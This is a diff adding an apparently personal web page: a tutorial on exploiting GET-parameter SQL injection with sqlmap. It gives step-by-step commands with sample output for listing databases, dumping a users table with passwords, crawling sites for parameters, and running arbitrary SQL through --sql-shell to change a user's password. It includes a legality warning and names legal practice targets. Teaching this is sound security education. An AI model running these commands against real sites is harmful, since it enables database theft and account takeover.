@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Home</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f9f9f9;
+        }
+
+        header {
+            background-color: #5e0f0d;
+            color: #b79323;
+            text-align: center;
+            justify-content: center;
+            display: flex;
+            padding: 1rem 0;
+            width: 100%;
+            height: 100px;
+            align-items: center;
+        }
+
+
+
+        .menu {
+            border-top: 2px solid white;
+            background-color: #5e0f0d;
+            padding: 0.5rem 0;
+            text-align: center;
+        }
+
+        .menu a {
+            color: white;
+            text-decoration: none;
+            margin: 0 1rem;
+        }
+
+        .menu a:hover {
+            text-decoration: underline;
+        }
+
+
+main {
+            padding: 1rem;
+        }
+        .text-content {
+            margin-bottom: 1rem;
+        }
+        .image-container {
+            text-align: center;
+            margin: 1rem 0;
+        }
+        .image-container img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+        }
+        .boxed-text {
+    display: inline-block;
+    border: 1px solid black;
+    background-color: #d3d3d3;
+    border-radius: 5px;
+    padding: 3px 6px;
+    color: black;
+    margin-top: 0;
+    line-height: 1;
+        }
+
+  .table-container {
+            width: 100%;
+            overflow-x: auto; 
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            min-width: 400px; 
+            background-color: white; 
+        }
+        th, td {
+            border: 1px solid #999;
+            padding: 5px 10px; 
+            text-align: left;
+            white-space: nowrap; 
+        }
+        th {
+            background-color: #d3c4a1; 
+        }
+.note-box {
+    border: 2px solid red; /* Margine roșie subțire */
+    background-color: rgba(255, 0, 0, 0.05); /* Roșu foarte subtil */
+    color: red; /* Text roșu */
+    padding: 12px 18px; /* Spațiu interior echilibrat */
+    display: inline-block; /* Se adaptează la conținut */
+    border-radius: 5px; /* Colțuri ușor rotunjite */
+    font-family: Arial, sans-serif; /* Font curat */
+    font-weight: normal; /* Text obișnuit */
+}
+
+a {
+  text-decoration: none;
+}
+
+
+.code-box {
+    background-color: #f4f4f4; /* Fundal gri deschis */
+    border: 1px solid #ddd; /* Bordură subțire gri */
+    border-radius: 8px; /* Colțuri rotunjite */
+    padding: 10px; /* Spațiu interior */
+    line-height: 1.2; /* Spațiere între linii */
+    display: block; /* Face ca elementul să ocupe întreaga lățime */
+    overflow-x: auto; /* Activează scroll-ul orizontal */
+    white-space: pre; /* Menține formatul codului */
+    max-width: 100%; /* Se asigură că nu depășește lățimea containerului */
+    font-size: 17.5px; /* Setează dimensiunea fontului */
+
+}
+
+.code-box2 {
+    background-color: #2d2d2d !important; /* Fundal gri închis */
+    border: 1px solid #ddd; /* Bordură subțire gri */
+    border-radius: 8px; /* Colțuri rotunjite */
+    padding: 10px; /* Spațiu interior */
+    line-height: 1.2; /* Spațiere între linii */
+    display: block; /* Face ca elementul să ocupe întreaga lățime */
+    overflow-x: auto; /* Activează scroll-ul orizontal */
+    white-space: pre; /* Menține formatul codului */
+    max-width: 100%; /* Se asigură că nu depășește lățimea containerului */
+    font-size: 17.5px; /* Setează dimensiunea fontului */
+    color: #d0d0d0;
+}
+
+.point {
+  color: #2d2d2d;
+}
+
+.date {
+  color: #5A9BD5;
+}
+
+.terminal {
+    width: 90%;  
+    max-width: 600px;  
+    background-color: #2d2d2d !important; /* Asigură că fundalul rămâne negru */
+    border: 2px solid white;
+    border-radius: 10px;
+    padding: 10px;
+    overflow-x: auto;
+    white-space: nowrap;
+    height: auto;
+    color: white; /* Setează culoarea textului pentru contrast */
+}
+.username {  
+        color: #66cc66; /* Verde închis pentru numele de utilizator */  
+    }  
+
+    .commandt {  
+        color: white;  
+    }  
+
+        footer {
+            background-color: #333;
+            color: white; 
+            text-align: center;
+            padding: 1rem;
+            border-top: 2px solid white;
+
+}
+
+  .blue-link {
+    color: #cc0000; /* Albastru potrivit pentru fundalul #f9f9f9 */
+    text-decoration: none;
+  }
+
+
+    </style>
+</head>
+<body>
+    <header>
+        <h2><b>andrewjames395.github.io</b></h2>
+    </header>
+
+        <div class="menu">
+        <a href="https://andrewjames395.github.io">Home</a>
+        <a href="#about">About</a>
+        <a href="https://andrewjames395.github.io/support.html">Support</a>
+    </div>
+
+    <main>
+
+<h2>GET Parameters sql injection with sqlmap</h2>
+
+<div class="image-container"><img src="https://sqlmap.org/images/screenshot.png" alt="sqlmap"></div>
+<br>
+<p>In the previous article, we learned the basic concepts of SQL Injection and performed this type of attack on a login field. You learned that this type of vulnerability is based on modifying the input fields to manipulate the sql query. However, on a website, a database interrogation does not exists in a such a field only. <br><br>
+
+You have probably seen, while browsing the web, links that have the following form:<br>
+
+<div class="code-box">https://mywebsite.com/documents.php?id=1<br>
+https://gogoshop.com/products.php?cat=fruits<br>
+https://myphotos.uk/photos.php?year=2018&month=may</div>
+
+<br>
+
+These types of URLs contain GET parameters. For a better understanding, let's analyze the first link:<br><br>
+
+<div class="code-box">https://mywebsite.com/documents.php?id=1</div>
+
+<br>
+
+A link with a GET parameter is characterized by a question mark, followed by the GET parameter (in our case, id), an equal sign, and the value (in this case, 1). Practically speaking, links with GET parameters send a request to the database to retrieve and display stored content on the page. In our example, the corresponding SQL query would look something like this:<br><br>
+
+<div class="code-box">SELECT * FROM documents WHERE id = 1</div><br>
+
+To test if our page is vulnerable to SQL Injection, we append an apostrophe to the end of the URL:<br><br>
+
+<div class="code-box">https://mywebsite.com/documents.php?id=1'</div><br>
+
+If executing this link returns an error message like "You have an error in your SQL syntax", the site is most likely vulnerable. However, even if the page loads normally, that does not necessarily mean the site is secure, so we will continue testing further. To exploit this type of vulnerability (GET parameter SQL Injection), we will use a special tool called sqlmap. Sqlmap is one of the most powerful and widely used hacking tools, specifically focused on SQL Injection. </p><br>
+
+<b>Installing sqlmap</b><br>
+
+<p>In your Linux terminal, if you haven't already, update your system using the following command: "sudo apt update && sudo apt upgrade". Then, install sqlmap by running: "sudo apt install sqlmap". Once the installation is complete, type "sqlmap" in the terminal. If the application's welcome screen appears, displaying its logo and usage instructions, it means everything was installed successfully. <br><br>
+
+<i>Note: If you encounter issues when running "sudo apt install sqlmap" (such as "app not found in apt"), try updating apt with "sudo apt-get update" command, and then proceed with installing sqlmap.</i>
+
+</p><br>
+
+<b>Using sqlmap </b><br>
+
+<p><div class="note-box">Note: Hacking a server or website without the owner's consent is illegal. Hacking techniques can only be used legally in environments specifically designed for testing such skills, on your own devices, or in a setting where you have the owner's permission. Also, all of the informations presented here are publicly available on many cybersecurity websites on internet. </div><br><br>
+
+Sqlmap is used with the following structure: "sqlmap <i>link_with_parameter</i>"
+
+So, in our case, the command will be:<br><br>
+
+<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap https://mywebsite.com/documents.php?id=1 -dbs</div><br>
+
+We added the -dbs option so that the program not only tests for vulnerabilities but also displays, in case the site is vulnerable to SQL Injection, the names of the databases. Once this command is entered, sqlmap will begin testing different combinations (payloads). If it discovers that the site is vulnerable, it will inform us of this.<br><br>
+
+<div class="code-box2">[<span class="date">11:08:00</span>] [<span class="username">INFO</span>] testing connection to the target URL
+[<span class="date">11:08:01</span>] [<span class="username">INFO</span>] testing if the target URL content is stable
+[<span class="date">11:08:01</span>] [<span class="username">INFO</span>] target URL content is stable
+[<span class="date">11:08:01</span>] [<span class="username">INFO</span>] testing if GET parameter 'id' is dynamic
+[<span class="date">11:08:01</span>] [<span class="username">INFO</span>] GET parameter 'id' appears to be dynamic
+[<span class="date">11:08:02</span>] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
+[<span class="date">11:08:02</span>] [<span class="username">INFO</span>] testing for SQL injection on GET parameter 'id'
+[<span class="date">11:08:02</span>] [<span class="username">INFO</span>] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[<span class="date">11:08:05</span>] [<span class="username">INFO</span>] testing 'Boolean-based blind - Parameter replace (original value)'
+[<span class="date">11:08:05</span>] [<span class="username">INFO</span>] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[<span class="date">11:08:15</span>] [<span class="username">INFO</span>] GET parameter 'id' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]</div><br>
+
+In the end, it will display the names of the databases, showing them with a [*] in front.<br><br>
+
+<div class="code-box2">[<span class="date">11:08:25</span>] [<span class="username">INFO</span>] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
+[<span class="date">11:09:39</span>] [<span class="username">INFO</span>] fetching database names
+available databases [2]:
+[*] mywebsite_db
+[*] information_schema
+
+[<span class="date">11:09:41</span>] [<span class="username">INFO</span>] fetched data logged to text files under '/home/userland/.local/share/sqlmap/output/testphp.vulnweb.com
+
+<span class="username">andrew@local:~$</span></div><br>
+
+Databases such as information_schema, performance_schema, and mysql are default system databases. The main database usually has a name similar to that of the website, so in our case the good one is "mywebsite_db". Now that we have the database name, we need to extract the table names from it. To do this, we will enter the database name using the -D attribute and use the -tables option.<br><br>
+
+<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap https://mywebsite.com/documents.php?id=1 -D mywebsite_db -tables</div><br>
+
+
+After running this command, we will receive an output similar to:<br><br>
+
+<div class="code-box2">Database: mywebsite_db
+[4 tables]
+
++--------------------+
+ | documents <span class="point">.</span>|
+ | news<span class="point">............</span>|
+ | photos<span class="point">.........</span>|
+ | users<span class="point">............</span>|
++--------------------+</div><br>
+
+To extract the content of a specific table, we will enter the database with -D and the table name using the -T attribute and use the "-dump" option.<br><br>
+
+<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap https://mywebsite.com/documents.php?id=1 -D mywebsite_db -T users -dump</div><br>
+
+Now we have the content of the users table. <br><br>
+
+<div class="code-box2">Database: mywebsite_db
+Table: users
+
++---------------------------------------------------------------------------+
+ | id | username <span class="point">..</span>| password <span class="point">.......</span>| city<span class="point">..................</span> |
++---------------------------------------------------------------------------+
+ | 1 <span class="point">.</span>| john_doe <span class="point">....</span>| password123 | New York<span class="point">........</span> |
+ | 2 <span class="point">.</span>| jane_smith <span class="point">.</span>| qwerty456 <span class="point">.....</span>| Los Angeles<span class="point">...</span> |
+ | 3 <span class="point">.</span>| mike_jones | letmein789 <span class="point">....</span>| Chicago <span class="point">...........</span>|
++---------------------------------------------------------------------------+</div><br>
+
+
+
+If we want, we can go further and extract only a specific column or certain columns from the table using the "-columns" option, and then, after we have it, entering them with -C option and retrive it with -dump.<br><br>
+
+<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap https://mywebsite.com/documents.php?id=1 -D mywebsite_db -T users -columns</div><br>
+
+<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap https://mywebsite.com/documents.php?id=1 -D mywebsite_db -T users -C username,password,city -dump</div><br>
+
+This is, in general, the database content extraction with sqlmap. However,with this tool, we can do much more. We can scan a specific website to find links with GET parameters, using the --crawl=2 option. This way, sqlmap will search for all links with GET parameters on that website and test them.<br><br>
+
+
+<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap https://mywebsite.com/ --crawl=2</div><br>
+
+It will also ask you if you want to save, in a temporary file, the links for a further testing. In this case, if you want this, you can test the links from a file with -m option:<br><br>
+
+<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap -m links.txt</div><br>
+
+Also, with sqlmap, we can not only extract tables content but also execute database commands, if the website is vulnerable to SQL Injection. To do this, we use the --sql-shell option. Thus, we can now execute SQL commands without worrying about the correct syntax, which varies depending on how the query is structured, as sqlmap will handle this automatically. We can add new users, modify existing user data, or run any other SQL command we want, depending on the database permissions. At this point, a basic understanding of SQL would be necessary.<br><br>
+
+<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap https://mywebsite.com/documents.php?id=1 --sql-shell
+sql-shell> UPDATE users SET password = 'newpassword123' WHERE id = 1; --this command will modify the password of the first user in the table</div><br></p>
+
+<b>Recap</b><br>
+
+<p>Sqlmap is used with the structure: sqlmap <i>link_with_parameter</i>. However, if our link has multiple parameters, the command should be structured like this: sqlmap --url="<i>link_with_parameter"</i>. <br><br>
+
+We use the -dbs option to retrieve the database names.<br>
+
+<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap <i>link</i> -dbs</div><br>
+
+Once we have its name, we specify the database name with the -D option, followed by -tables to list the tables.<br><br>
+
+<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap <i>link</i> -D <i>dbname</i> -tables</div><br>
+
+After obtaining both the database and table names, we specify the database name with -D atribute and the table name with -T , and then we extract the content with -dump option.<br><br>
+
+
+<div class="code-box2"><span class="username">andrew@local:~$</span> sqlmap <i>link</i> -D <i>dbname</i> -T <i>tblname</i> -dump</div><br>
+
+
+It is important to note that just because a link follows the format we discussed in this article, it does not automatically mean it is vulnerable to SQL Injection. It simply indicates that it queries a database. </p><br>
+
+<b>Can this vulnerability be exploited directly from the link, without sqlmap?</b><br>
+
+<p>Yes, but it is more complicated and requires a fairly good understanding of the SQL language. With sqlmap, we automate the testing process and make it much simpler.</p><br>
+
+
+<b>Where can I practice this attack legally?</b><br>
+
+<p>Besides major platforms like Hack The Box, Hack This Site, or Parrot CTF, there are certain websites where this vulnerability can be legally exploited. <br><br>
+
+One of them is <a href="http://testphp.vulnweb.com/"><span class="blue-link">testphp.vulnweb.com</span></a>, a site created by the cybersecurity platform Acunetix, which is intentionally designed with multiple vulnerabilities. By exploring the site, you will find several links with GET parameters, some of which are vulnerable to SQL Injection.<br><br>
+
+Additionally, the first level of <a href="http://redtiger.labs.overthewire.org/level1.php"><span class ="blue-link">RedTigerLabs</span></a> contains such a vulnerability. You need to find the link with a GET parameter, as that one is vulnerable to SQL Injection.</p><br>
+
+<b>How common is the GET parameter SQL injection vulnerability today?</b><br>
+
+<p>Despite efforts to mitigate this type of vulnerability, SQL injection (in all its forms) remains one of the most prevalent security threats today. Research conducted by Aikido.dev showed that in 2024, 6.7% of all vulnerabilities in open-source projects and 10% in closed-source projects were SQLi. Additionally, a 2023 report revealed that 23% of the major identified vulnerabilities were of this type,and the MITRE Corporation top 25 most common vulnerabilities report for 2024 places SQL Injection on the 3rd place. These statistics highlight the importance of implementing proper security measures.</p>
+
+
+
+<b>Related article</b><br>
+
+<p><a href="https://youtu.be/XBsnkLRelnU?si=H7alfhkpJoteKzDt"><span class="blue-link">SQL Injection exploitation on testphp.vulnweb.com - Youtube tutorial</span></a>
+<br><br>
+<a href="https://www.aikido.dev/blog/the-state-of-sql-injections"><span class="blue-link">Is SQL Injection still a thing in 2024 - Video article by aikido.dev</span></a></p>
+
+<a href="https://cwe.mitre.org/top25/archive/2024/2024_cwe_top25.html"><span class="blue-link">MITRE Corporation top 25 most common vulnerabilities report for 2024</span></a></p>
+
+
+
+
+
+
+
+
+
+
+</main>
+</html>
